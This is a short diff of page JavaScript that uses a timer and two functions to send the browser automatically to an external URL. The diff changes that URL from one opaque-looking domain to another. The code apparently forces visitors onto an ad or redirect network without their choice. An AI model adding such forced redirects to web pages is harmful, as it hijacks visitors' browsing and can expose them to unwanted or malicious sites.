@@ -5,8 +5,8 @@
         fh();}
     setTimeout('hh();', 500);
     function fh(){
-        location.href="https://chikraighotoops.com/4/8500565";
+        location.href="https://psegeevalrat.net/4/8525379";
     }
     function goon(){
-        location.href="https://chikraighotoops.com/4/8500565";
+        location.href="https://psegeevalrat.net/4/8525379";
     }
